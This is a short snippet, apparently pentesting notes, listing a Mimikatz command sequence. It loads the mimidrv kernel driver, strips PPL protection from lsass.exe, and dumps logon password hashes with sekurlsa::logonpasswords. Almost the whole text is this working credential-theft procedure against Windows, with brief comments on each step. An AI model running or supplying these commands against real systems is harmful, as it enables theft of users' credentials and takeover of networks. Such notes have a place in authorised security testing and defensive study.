Access token is stored inside the kernel.

```
mimikatz # privilege::debug
mimikatz # 
mimikatz # !+ # (Command 1) load mimidrive.sys to disable PPL protection
mimikatz # !processprotect /process:lsass.exe /remove # (Command 2 disable PPL)
mimikatz #
mimikatz #sekurlsa::logonpasswords #retrived password hash from memory(lsass)
mimikatz #
mimikatz #